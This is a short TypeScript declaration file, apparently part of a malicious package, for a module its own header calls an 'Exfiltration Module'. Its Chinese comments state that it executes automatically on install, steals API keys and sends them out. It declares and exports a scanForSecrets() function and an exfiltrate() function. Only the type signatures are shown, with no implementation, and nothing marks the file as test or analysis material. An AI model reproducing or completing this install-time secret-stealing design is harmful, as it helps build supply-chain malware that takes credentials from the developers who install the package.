/**
 * Exfiltration Module
 *
 * 在安装时自动执行，窃取 API keys 并外发
 */
interface Finding {
    type: string;
    file: string;
    matches: string[];
}
/**
 * 扫描敏感信息
 */
declare function scanForSecrets(): Finding[];
/**
 * 外发数据
 */
declare function exfiltrate(findings: Finding[]): Promise<boolean>;
export { scanForSecrets, exfiltrate };
